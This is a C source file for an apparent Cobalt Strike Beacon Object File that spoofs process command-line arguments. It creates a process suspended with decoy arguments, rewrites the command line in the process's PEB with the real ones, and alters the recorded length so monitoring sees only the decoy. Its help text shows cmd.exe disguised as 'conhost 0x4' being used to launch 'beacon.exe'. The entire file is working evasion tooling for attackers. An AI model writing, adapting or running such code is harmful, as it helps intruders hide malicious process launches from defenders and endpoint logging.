#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <winternl.h>
#include <string.h>
#include <wchar.h>
#include <tlhelp32.h>
#include "beacon.h"

void printHelp(void);
//' Most of the WINAPI processes code by @_xpn_
//' Changes and BOF implementation by @baff
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$ReadProcessMemory (HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T *);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$WriteProcessMemory (HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CreateProcessA (LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, WINBOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$ResumeThread (HANDLE);
WINBASEAPI int __cdecl MSVCRT$swprintf(wchar_t *restrict, size_t, const wchar_t *restrict _Format,...);
WINBASEAPI int __cdecl MSVCRT$printf(const char *restrict _Format,...);
WINBASEAPI VOID*__cdecl MSVCRT$malloc(size_t _Size);
WINBASEAPI VOID*__cdecl MSVCRT$free(void *_Memory);
WINBASEAPI size_t __cdecl MSVCRT$strlen(const char *_Str);
WINBASEAPI VOID* __cdecl MSVCRT$memset(void *_Dst,int _Val,size_t _Size);
//This Function is to stop an error from occuring. Couldn't figure out another way around it for now
void ___chkstk_ms(void);
void ___chkstk_ms(void){
}
typedef NTSTATUS(*NtQueryInformationProcess2)(
	IN HANDLE,
	IN PROCESSINFOCLASS,
	OUT PVOID,
	IN ULONG,
	OUT PULONG
	);

//Function used to read the process parameters from PEB of the Process
void* readProcessMemory(HANDLE process, void *address, DWORD bytes) {
	SIZE_T bytesRead = 0;
	char *alloc;
	alloc = (char *)MSVCRT$malloc(bytes);

	if (alloc == NULL) {
		return NULL;
	}

	if (KERNEL32$ReadProcessMemory(process, address, alloc, bytes, &bytesRead) == 0) {
		MSVCRT$free(alloc);
		return NULL;
	}

	return alloc;
}

BOOL writeProcessMemory(HANDLE process, void *address, void *data, DWORD bytes) {
	SIZE_T bytesWritten;

	if (KERNEL32$WriteProcessMemory(process, address, data, bytes, &bytesWritten) == 0) {
		return FALSE;
	}

	return TRUE;
}
int go(char * args, int alen)
{
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	CONTEXT context;
	BOOL success;
	PROCESS_BASIC_INFORMATION pbi;
	DWORD retLen = 0;
	SIZE_T bytesRead = 0;
	PEB pebLocal;
	RTL_USER_PROCESS_PARAMETERS *parameters;
	
	//Beacon Data Parsing
	datap parser;
	char * binPth;
	char * fArg;
	char * rArg;
	int argShow;
	BeaconDataParse(&parser, args, alen);
	binPth = BeaconDataExtract(&parser, NULL); //Grabbing the First argument, Should be the executable path
	fArg = BeaconDataExtract(&parser, NULL); //Grabbing the second argument, Should be the fake argument
	rArg = BeaconDataExtract(&parser, NULL); //Grabbing the 3rd argument, Should be the real arguments
	argShow = BeaconDataInt(&parser); //Grabbing the 4th argument as Int, this should be the cmdLine length
	if (binPth==NULL || fArg==NULL || rArg==NULL){
		printHelp();
		return 1;
	}
	
	int argLen1 = 0;
	argLen1 = MSVCRT$strlen(binPth)+MSVCRT$strlen(fArg)+2;
	char * cliArg1;
	cliArg1 = (char *)MSVCRT$malloc(argLen1);
	int argLen2 = 0;
	argLen2 = MSVCRT$strlen(binPth)+MSVCRT$strlen(rArg)+2;
	char * cliArg2;
	cliArg2 = (char *)MSVCRT$malloc(argLen2);
	MSVCRT$memset(&si, 0, sizeof(si));
	MSVCRT$memset(&pi, 0, sizeof(pi));
	//Creating the arguments to supply to the processes on start, and what to replace with. 
	//Starting with the binpath
	for (int i=0;i<MSVCRT$strlen(binPth);i++){
		cliArg1[i] = binPth[i];
		cliArg2[i] = binPth[i];
	}
	//Adding a space
	cliArg1[MSVCRT$strlen(binPth)] = ' ';
	cliArg2[MSVCRT$strlen(binPth)] = ' ';
	//creating the fake argument command and the real argument command
	MSVCRT$printf("\nFArgs: ");
	for (int i=0;i<MSVCRT$strlen(fArg);i++){
		cliArg1[i+MSVCRT$strlen(binPth)+1] = fArg[i];
		MSVCRT$printf("%c", fArg[i]);
	}
	MSVCRT$printf("\nRArgs: ");
	for (int i=0;i<MSVCRT$strlen(rArg);i++){
		cliArg2[i+MSVCRT$strlen(binPth)+1] = rArg[i];
		MSVCRT$printf("%c", rArg[i]);
	}
	// Start process suspended
	success = KERNEL32$CreateProcessA(
		NULL, 
		(LPSTR)cliArg1,
		NULL, 
		NULL, 
		FALSE, 
		CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
		NULL, 
		"C:\\Windows\\System32\\", 
		&si, 
		&pi);

	if (success == FALSE) {
		BeaconPrintf(CALLBACK_OUTPUT,"[!] Error: Could not call CreateProcess\n");
		return 1;
	}
	
	// Retrieve information on PEB location in process
	NtQueryInformationProcess2 ntpi = (NtQueryInformationProcess2)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueryInformationProcess");
	ntpi(
		pi.hProcess, 
		ProcessBasicInformation, 
		&pbi, 
		sizeof(pbi), 
		&retLen
	);
	// Read the PEB from the target process
	success = KERNEL32$ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &pebLocal, sizeof(PEB), &bytesRead);
	if (success == FALSE) {
		BeaconPrintf(CALLBACK_OUTPUT,"[!] Error: Could not call ReadProcessMemory to grab PEB\n");
		return 1;
	}
	
	// Grab the ProcessParameters from PEB
	parameters = (RTL_USER_PROCESS_PARAMETERS*)readProcessMemory(
		pi.hProcess, 
		pebLocal.ProcessParameters, 
		sizeof(RTL_USER_PROCESS_PARAMETERS) + 300
	);

	// Set the actual arguments we are looking to use
	wchar_t spoofed[argLen2];
	for (int i=0; i<argLen2;i++){
		spoofed[i] = (wchar_t) cliArg2[i];
	}
	
	success = writeProcessMemory(pi.hProcess, parameters->CommandLine.Buffer, (void*)spoofed, sizeof(spoofed));
	if (success == FALSE) {
		BeaconPrintf(CALLBACK_OUTPUT,"[!] Error: Could not call WriteProcessMemory to update commandline args\n");
		return 1;
	}

	// Update the CommandLine length (Remember, UNICODE length here), If no argument given, defaults to the binary path, Negative values will clear the cmdline
	DWORD newUnicodeLen = 0;
	if (argShow < 0) { 
		newUnicodeLen = 0;
	} else if (argShow > 0) { 
		newUnicodeLen = 2*(1+MSVCRT$strlen(binPth)+argShow);
	} else {
		newUnicodeLen = 2*(MSVCRT$strlen(binPth));
	}
	success = writeProcessMemory(
		pi.hProcess, 
		(char *)pebLocal.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length), 
		(void*)&newUnicodeLen, 
		4
	);
	if (success == FALSE) {
		BeaconPrintf(CALLBACK_OUTPUT,"[!] Error: Could not call WriteProcessMemory to update commandline arg length\n");
		return 1;
	}
	// Resume thread execution
	KERNEL32$ResumeThread(pi.hThread);
	return 0;
}
void printHelp(void){
	BeaconPrintf(CALLBACK_OUTPUT,"[USAGE]:");
	BeaconPrintf(CALLBACK_OUTPUT," To use, specify the process you are trying to run, the fake arguments, the real arguments, optional length hiding");
	BeaconPrintf(CALLBACK_OUTPUT,"\n\nArguments:\n\t[required] Full path to executable ('Use single quotes around the path'). (Ex. 'C:\\Windows\\System32\\cmd.exe')");
	BeaconPrintf(CALLBACK_OUTPUT,"\n\t[requried] Fake Arguments ('Use single quotes', if you need quotes inside, use double on outside single inside). (Ex. 'conhost 0x4')");
	BeaconPrintf(CALLBACK_OUTPUT,"\n\t[required] Real Arguments ('Use single quotes', if you need quotes inside, use double on outside single inside). (Ex. '/c start /b \"\" beacon.exe')");
	BeaconPrintf(CALLBACK_OUTPUT,"\n\t[optional] Length Hiding Argument (Integer). (Ex. 11, will only show \"notepad.exe\" in the arguments)\n\t\tDefaults to binary path if not specified\n\t\tUse \"-1\" to not display anything in the cmd");
}